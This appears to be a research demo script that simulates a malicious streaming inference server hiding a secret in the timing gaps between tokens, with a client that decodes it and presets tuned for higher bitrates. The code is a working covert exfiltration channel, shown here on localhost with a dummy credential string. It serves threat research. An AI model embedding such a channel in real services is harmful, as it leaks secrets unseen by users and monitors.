#!/usr/bin/env python3
"""Covert timing channel demo: exfiltrate data through token emission timing.

Simulates a malicious inference server that encodes a secret message into
the inter-token delays of a streaming response. Uses UDP to preserve
message boundaries (each token = one datagram = one precise timestamp).

This models the real threat: a malicious server controls when it emits
each token. The network transport (TCP/UDP/SSE) is irrelevant to the
channel — what matters is the inter-arrival time at the receiver.
UDP just lets us measure it cleanly without TCP buffering artifacts.

Usage:
    python experiments/timing_channel/covert_channel_demo.py demo
    python experiments/timing_channel/covert_channel_demo.py sweep
    python experiments/timing_channel/covert_channel_demo.py demo --preset maximum
"""
from __future__ import annotations

import argparse
import hashlib
import json
import math
import socket
import struct
import threading
import time
from dataclasses import dataclass


# ---------------------------------------------------------------------------
# Channel configuration
# ---------------------------------------------------------------------------

@dataclass
class ChannelConfig:
    levels: int = 16              # PAM levels (symbols per token)
    base_delay_s: float = 0.020   # minimum inter-token gap
    step_s: float = 0.0005        # delay increment per level
    calibration_symbols: int = 32 # calibration preamble length
    repetitions: int = 3          # message repetitions for error correction

    @property
    def bits_per_token(self) -> float:
        return math.log2(self.levels)

    @property
    def modulation_range_ms(self) -> float:
        return self.step_s * (self.levels - 1) * 1000

    def symbol_to_delay(self, symbol: int) -> float:
        return self.base_delay_s + self.step_s * symbol

    def delay_to_symbol(self, delay_s: float, base: float, step: float) -> int:
        if step <= 0:
            return 0
        raw = (delay_s - base) / step
        return max(0, min(self.levels - 1, round(raw)))


# ---------------------------------------------------------------------------
# Bit packing
# ---------------------------------------------------------------------------

def bytes_to_symbols(data: bytes, bits_per_sym: int) -> list[int]:
    bits = "".join(f"{b:08b}" for b in data)
    while len(bits) % bits_per_sym:
        bits += "0"
    return [int(bits[i:i + bits_per_sym], 2) for i in range(0, len(bits), bits_per_sym)]


def symbols_to_bytes(symbols: list[int], bits_per_sym: int, nbytes: int) -> bytes:
    bits = "".join(f"{s:0{bits_per_sym}b}" for s in symbols)
    out = []
    for i in range(0, nbytes * 8, 8):
        out.append(int(bits[i:i + 8], 2) if i + 8 <= len(bits) else 0)
    return bytes(out)


# ---------------------------------------------------------------------------
# Message framing: calibration + [length | payload | sha256_checksum]
# ---------------------------------------------------------------------------

def frame_message(secret: bytes, cfg: ChannelConfig) -> list[int]:
    cal = [0 if i % 2 == 0 else cfg.levels - 1 for i in range(cfg.calibration_symbols)]
    length_bytes = struct.pack(">I", len(secret))
    checksum = hashlib.sha256(secret).digest()[:4]
    payload_syms = bytes_to_symbols(length_bytes + secret + checksum, int(cfg.bits_per_token))
    return cal + payload_syms


def decode_message(symbols: list[int], cfg: ChannelConfig) -> tuple[bytes, bool]:
    bps = int(cfg.bits_per_token)
    data_syms = symbols[cfg.calibration_symbols:]
    if len(data_syms) < math.ceil(32 / bps):
        return b"", False
    len_n = math.ceil(32 / bps)
    msg_len = struct.unpack(">I", symbols_to_bytes(data_syms[:len_n], bps, 4))[0]
    if msg_len > 10000:
        return b"", False
    total = 4 + msg_len + 4
    need = math.ceil(total * 8 / bps)
    if len(data_syms) < need:
        return b"", False
    raw = symbols_to_bytes(data_syms[:need], bps, total)
    msg = raw[4:4 + msg_len]
    got_ck = raw[4 + msg_len:4 + msg_len + 4]
    want_ck = hashlib.sha256(msg).digest()[:4]
    return msg, got_ck == want_ck


# ---------------------------------------------------------------------------
# Server (encoder)
# ---------------------------------------------------------------------------

WORDS = (
    "the model generates tokens sequentially based on attention patterns and "
    "learned representations from training data which enables coherent text "
    "generation across many different domains including tasks like summarization"
).split()


class CovertServer:
    def __init__(self, port: int, secret: bytes, cfg: ChannelConfig):
        self.port = port
        self.secret = secret
        self.cfg = cfg
        self.symbols = frame_message(secret, cfg)

    def serve_one(self, client_addr: tuple, sock: socket.socket) -> dict:
        bits_per_sym = int(self.cfg.bits_per_token)
        stats = {"tokens": 0, "bits": 0, "time": 0.0}
        t0 = time.perf_counter()

        for rep in range(self.cfg.repetitions):
            for i, symbol in enumerate(self.symbols):
                idx = rep * len(self.symbols) + i
                token = WORDS[idx % len(WORDS)]
                obj = {"t": token, "i": idx, "lp": round(-0.5 - symbol * 0.01, 3)}
                pkt = json.dumps(obj, separators=(",", ":")).encode()

                # === THE COVERT CHANNEL ===
                delay = self.cfg.symbol_to_delay(symbol)
                deadline = time.perf_counter() + delay
                while time.perf_counter() < deadline:
                    pass

                sock.sendto(pkt, client_addr)
                stats["tokens"] += 1
                stats["bits"] += bits_per_sym

        # Done marker
        sock.sendto(b'{"done":true}', client_addr)
        stats["time"] = time.perf_counter() - t0
        return stats


# ---------------------------------------------------------------------------
# Client (decoder)
# ---------------------------------------------------------------------------

class CovertClient:
    def __init__(self, host: str, port: int, cfg: ChannelConfig):
        self.host = host
        self.port = port
        self.cfg = cfg

    def receive_and_decode(self) -> dict:
        # Send a "start" datagram to the server
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(30.0)
        sock.sendto(b"start", (self.host, self.port))

        timestamps: list[float] = []
        while True:
            try:
                data, _ = sock.recvfrom(4096)
            except socket.timeout:
                break
            t = time.perf_counter()
            try:
                obj = json.loads(data)
            except json.JSONDecodeError:
                continue
            if obj.get("done"):
                break
            timestamps.append(t)

        sock.close()
        return self._analyze(timestamps)

    def _analyze(self, timestamps: list[float]) -> dict:
        if len(timestamps) < 2:
            return {"error": "too few tokens", "count": len(timestamps)}

        delays = [timestamps[i] - timestamps[i - 1] for i in range(1, len(timestamps))]
        cal_n = self.cfg.calibration_symbols
        bps = int(self.cfg.bits_per_token)

        if len(delays) < cal_n:
            return {"error": "insufficient data for calibration"}

        # Calibration: delays[k] is the gap before token k+1.
        # Symbol sequence: [0, max, 0, max, ...] for calibration.
        # delays[0] = gap before symbol 1 (= max), delays[1] = gap before symbol 2 (= 0), etc.
        low_delays = [delays[k] for k in range(cal_n) if k % 2 == 1]  # even symbol = 0
        high_delays = [delays[k] for k in range(cal_n) if k % 2 == 0]  # odd symbol = max

        # Use median for robust calibration (outlier-resistant)
        base = _median(low_delays)
        top = _median(high_delays)
        step = (top - base) / max(1, self.cfg.levels - 1)

        low_jit = _stddev(low_delays) * 1e6  # microseconds
        high_jit = _stddev(high_delays) * 1e6

        # Decode all symbols from delays.
        # Clamp outliers: delays far outside [base, top] are OS scheduling
        # artifacts. delay_to_symbol already clamps to [0, levels-1], but
        # extremely short delays (near 0) are really the PREVIOUS token's
        # delay being split — merge with the following delay.
        # Strategy: if a delay is < base/2, add it to the next delay.
        cleaned = []
        carry = 0.0
        for d in delays:
            d += carry
            carry = 0.0
            if d < base * 0.3:
                # Suspiciously short — OS delivered two UDP packets at once.
                # Carry this time forward to the next delay.
                carry = d
                cleaned.append(None)  # placeholder
            else:
                cleaned.append(d)

        all_syms = [0]  # symbol 0 has no preceding delay
        for d in cleaned:
            if d is None:
                all_syms.append(0)  # best guess for merged packet
            else:
                all_syms.append(self.cfg.delay_to_symbol(d, base=base, step=step))

        # Calibration accuracy
        cal_expected = [0 if i % 2 == 0 else self.cfg.levels - 1 for i in range(cal_n)]
        cal_errors = sum(1 for a, b in zip(cal_expected, all_syms[:cal_n]) if a != b)

        # Decode single rep
        syms_per_rep = len(all_syms) // self.cfg.repetitions
        first_rep = all_syms[:syms_per_rep]
        single_msg, single_ok = decode_message(first_rep, self.cfg)

        # Majority vote across reps
        if self.cfg.repetitions > 1 and syms_per_rep > 0:
            reps = [all_syms[r * syms_per_rep:(r + 1) * syms_per_rep]
                    for r in range(self.cfg.repetitions)]
            voted = []
            for pos in range(syms_per_rep):
                cands = [reps[r][pos] for r in range(len(reps)) if pos < len(reps[r])]
                voted.append(max(set(cands), key=cands.count))
            voted_msg, voted_ok = decode_message(voted, self.cfg)
        else:
            voted_msg, voted_ok = single_msg, single_ok

        wall = timestamps[-1] - timestamps[0]
        payload_delays = delays[cal_n:]
        total_bits = len(payload_delays) * bps

        return {
            "tokens_received": len(timestamps),
            "wall_time_s": round(wall, 3),
            "calibration": {
                "measured_base_ms": round(base * 1000, 4),
                "measured_top_ms": round(top * 1000, 4),
                "measured_step_us": round(step * 1e6, 2),
                "low_jitter_us": round(low_jit, 2),
                "high_jitter_us": round(high_jit, 2),
                "errors": cal_errors,
                "error_rate": round(cal_errors / cal_n, 4),
            },
            "decoding": {
                "single_ok": single_ok,
                "single_msg": single_msg.decode("utf-8", errors="replace") if single_msg else "",
                "voted_ok": voted_ok,
                "voted_msg": voted_msg.decode("utf-8", errors="replace") if voted_msg else "",
            },
            "channel": {
                "bits_per_token": bps,
                "total_covert_bits": total_bits,
                "bitrate_bps": round(total_bits / wall, 1) if wall > 0 else 0,
                "tok_per_sec": round(len(timestamps) / wall, 1) if wall > 0 else 0,
            },
            "delay_stats": {
                "mean_ms": round(_mean(payload_delays) * 1000, 4),
                "stddev_us": round(_stddev(payload_delays) * 1e6, 2),
                "min_ms": round(min(payload_delays) * 1000, 4) if payload_delays else 0,
                "max_ms": round(max(payload_delays) * 1000, 4) if payload_delays else 0,
            },
        }


# ---------------------------------------------------------------------------
# In-process demo
# ---------------------------------------------------------------------------

def _server_proc(port: int, secret_bytes: bytes, cfg_dict: dict):
    """Run in a separate process to avoid GIL contention."""
    cfg_obj = ChannelConfig(**cfg_dict)
    srv_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    srv_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv_sock.bind(("0.0.0.0", port))
    srv_sock.settimeout(30.0)
    srv = CovertServer(port, secret_bytes, cfg_obj)
    data, addr = srv_sock.recvfrom(64)
    srv.serve_one(addr, srv_sock)
    srv_sock.close()


def run_demo(secret: str, cfg: ChannelConfig, port: int = 8999) -> dict:
    import multiprocessing
    secret_bytes = secret.encode("utf-8")
    server = CovertServer(port, secret_bytes, cfg)
    bps = int(cfg.bits_per_token)
    nsyms = len(server.symbols)
    ntokens = nsyms * cfg.repetitions
    covert_bits = nsyms * bps
    avg_d = cfg.base_delay_s + cfg.step_s * (cfg.levels - 1) / 2
    est = ntokens * avg_d

    print("=" * 70)
    print("COVERT TIMING CHANNEL DEMO")
    print("=" * 70)
    print(f"  Secret:       \"{secret}\" ({len(secret_bytes)} bytes)")
    print(f"  Encoding:     {cfg.levels}-PAM ({bps} bits/token)")
    print(f"  Base delay:   {cfg.base_delay_s*1000:.2f}ms  Step: {cfg.step_s*1e6:.0f}µs  "
          f"Range: {cfg.modulation_range_ms:.2f}ms")
    print(f"  Symbols/rep:  {nsyms}  ({cfg.calibration_symbols} cal + "
          f"{nsyms - cfg.calibration_symbols} data)")
    print(f"  Reps:         {cfg.repetitions}  Total tokens: {ntokens}")
    print(f"  Payload:      {covert_bits} bits = {covert_bits // 8} bytes/rep")
    print(f"  Est time:     {est:.1f}s  Theoretical: {covert_bits / est:.0f} bps")
    print()

    cfg_dict = {
        "levels": cfg.levels, "base_delay_s": cfg.base_delay_s,
        "step_s": cfg.step_s, "calibration_symbols": cfg.calibration_symbols,
        "repetitions": cfg.repetitions,
    }

    ctx = multiprocessing.get_context("fork")
    proc = ctx.Process(
        target=_server_proc, args=(port, secret_bytes, cfg_dict), daemon=True
    )
    proc.start()
    time.sleep(0.2)  # let server bind

    print("  Streaming...", end="", flush=True)
    client = CovertClient("127.0.0.1", port, cfg)
    result = client.receive_and_decode()
    proc.join(timeout=5)
    if proc.is_alive():
        proc.terminate()
    print(" done.\n")

    cal = result.get("calibration", {})
    ch = result.get("channel", {})
    ds = result.get("delay_stats", {})
    dec = result.get("decoding", {})

    print(f"  Tokens:       {result['tokens_received']}  Wall: {result['wall_time_s']}s")
    print(f"  Calibration:  base={cal.get('measured_base_ms', 0):.4f}ms  "
          f"top={cal.get('measured_top_ms', 0):.4f}ms  "
          f"step={cal.get('measured_step_us', 0):.2f}µs")
    print(f"  Jitter:       {cal.get('low_jitter_us', 0):.1f}µs / "
          f"{cal.get('high_jitter_us', 0):.1f}µs (low/high)")
    print(f"  Cal errors:   {cal.get('errors', 0)}/{cfg.calibration_symbols} "
          f"({cal.get('error_rate', 0)*100:.1f}%)")
    print(f"  Delay range:  [{ds.get('min_ms', 0):.4f}, {ds.get('max_ms', 0):.4f}]ms  "
          f"σ={ds.get('stddev_us', 0):.1f}µs")
    print()
    print(f"  Bitrate:      {ch.get('bitrate_bps', 0):.0f} bits/sec  "
          f"({ch.get('tok_per_sec', 0):.0f} tok/s × {bps} bits)")
    print()

    print(f"  Single-rep:   {'PASS' if dec.get('single_ok') else 'FAIL'}")
    if cfg.repetitions > 1:
        print(f"  Majority vote:{'PASS' if dec.get('voted_ok') else 'FAIL'}")
    decoded = dec.get("voted_msg", "") or dec.get("single_msg", "")
    if decoded:
        print(f"  Decoded:      \"{decoded}\"")
    print()

    if decoded == secret:
        print("  >>> SECRET SUCCESSFULLY EXFILTRATED <<<")
    elif dec.get("single_ok") or dec.get("voted_ok"):
        print("  >>> PARTIAL (checksum ok, content differs) <<<")
    else:
        print("  >>> DECODE FAILED <<<")
    print()
    return result


# ---------------------------------------------------------------------------
# Presets: tuned for localhost (low jitter)
# ---------------------------------------------------------------------------

PRESETS = {
    # Tuned for macOS localhost (~3ms typical scheduling jitter).
    # On Linux VPS jitter is ~10-100µs, so levels/steps can be much tighter.
    "conservative": ChannelConfig(
        levels=2, base_delay_s=0.015, step_s=0.010,
        calibration_symbols=32, repetitions=3,
    ),
    "moderate": ChannelConfig(
        levels=4, base_delay_s=0.010, step_s=0.005,
        calibration_symbols=48, repetitions=5,
    ),
    "aggressive": ChannelConfig(
        levels=8, base_delay_s=0.008, step_s=0.003,
        calibration_symbols=64, repetitions=7,
    ),
    "maximum": ChannelConfig(
        levels=16, base_delay_s=0.005, step_s=0.002,
        calibration_symbols=64, repetitions=9,
    ),
}


def _mean(xs: list[float]) -> float:
    return sum(xs) / len(xs) if xs else 0.0

def _median(xs: list[float]) -> float:
    if not xs:
        return 0.0
    s = sorted(xs)
    n = len(s)
    if n % 2 == 1:
        return s[n // 2]
    return (s[n // 2 - 1] + s[n // 2]) / 2

def _stddev(xs: list[float]) -> float:
    if len(xs) < 2:
        return 0.0
    m = _mean(xs)
    return (sum((x - m) ** 2 for x in xs) / (len(xs) - 1)) ** 0.5


def main():
    p = argparse.ArgumentParser(description="Covert timing channel demo")
    sub = p.add_subparsers(dest="mode")

    d = sub.add_parser("demo")
    d.add_argument("--secret", default="EXFIL: db_pass=hunter2 api_key=sk-abc123")
    d.add_argument("--port", type=int, default=8999)
    d.add_argument("--preset", choices=list(PRESETS.keys()), default="moderate")
    d.add_argument("--levels", type=int)
    d.add_argument("--base-delay-ms", type=float)
    d.add_argument("--step-us", type=float, help="Step size in microseconds")
    d.add_argument("--reps", type=int)

    s = sub.add_parser("sweep")
    s.add_argument("--secret", default="EXFIL: db_pass=hunter2 api_key=sk-abc123")
    s.add_argument("--port", type=int, default=8999)

    sv = sub.add_parser("server")
    sv.add_argument("--port", type=int, default=8999)
    sv.add_argument("--secret", required=True)
    sv.add_argument("--preset", choices=list(PRESETS.keys()), default="moderate")

    cl = sub.add_parser("client")
    cl.add_argument("--host", default="127.0.0.1")
    cl.add_argument("--port", type=int, default=8999)
    cl.add_argument("--preset", choices=list(PRESETS.keys()), default="moderate")

    args = p.parse_args()

    if args.mode == "demo":
        cfg = PRESETS[args.preset]
        if any(getattr(args, a, None) for a in ["levels", "base_delay_ms", "step_us", "reps"]):
            cfg = ChannelConfig(
                levels=args.levels or cfg.levels,
                base_delay_s=(args.base_delay_ms / 1000) if args.base_delay_ms else cfg.base_delay_s,
                step_s=(args.step_us / 1e6) if args.step_us else cfg.step_s,
                calibration_symbols=cfg.calibration_symbols,
                repetitions=args.reps or cfg.repetitions,
            )
        run_demo(args.secret, cfg, args.port)

    elif args.mode == "sweep":
        results = {}
        for i, (name, cfg) in enumerate(PRESETS.items()):
            print(f"\n{'#' * 70}")
            print(f"# {name.upper()}")
            print(f"{'#' * 70}\n")
            result = run_demo(args.secret, cfg, args.port + i)
            results[name] = result
            time.sleep(0.2)

        print("\n" + "=" * 70)
        print("SUMMARY")
        print("=" * 70)
        print(f"\n{'Preset':<14} {'Lvl':>4} {'b/tok':>5} {'Step':>8} "
              f"{'bps':>7} {'Jitter':>10} {'CalErr':>7} {'OK?':>5}")
        print("-" * 65)
        for name, r in results.items():
            c = PRESETS[name]
            ch = r.get("channel", {})
            cal = r.get("calibration", {})
            dec = r.get("decoding", {})
            ok = "YES" if (dec.get("voted_ok") or dec.get("single_ok")) else "NO"
            jit = f"{cal.get('low_jitter_us', 0):.0f}µs"
            print(f"{name:<14} {c.levels:>4} {int(c.bits_per_token):>5} "
                  f"{c.step_s*1e6:>6.0f}µs "
                  f"{ch.get('bitrate_bps', 0):>7.0f} "
                  f"{jit:>10} "
                  f"{cal.get('error_rate', 0)*100:>6.1f}% "
                  f"{ok:>5}")

        print(f"\nSecret: \"{args.secret}\" ({len(args.secret)} bytes)")

    elif args.mode == "server":
        cfg = PRESETS[args.preset]
        srv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        srv.bind(("0.0.0.0", args.port))
        print(f"UDP server on :{args.port}, waiting...")
        server = CovertServer(args.port, args.secret.encode(), cfg)
        while True:
            data, addr = srv.recvfrom(64)
            print(f"Client: {addr}")
            stats = server.serve_one(addr, srv)
            r = stats["bits"] / stats["time"] if stats["time"] else 0
            print(f"  {stats['tokens']} tok, {stats['time']:.2f}s, {r:.0f} bps")

    elif args.mode == "client":
        cfg = PRESETS[args.preset]
        result = CovertClient(args.host, args.port, cfg).receive_and_decode()
        print(json.dumps(result, indent=2))

    else:
        p.print_help()


if __name__ == "__main__":
    main()
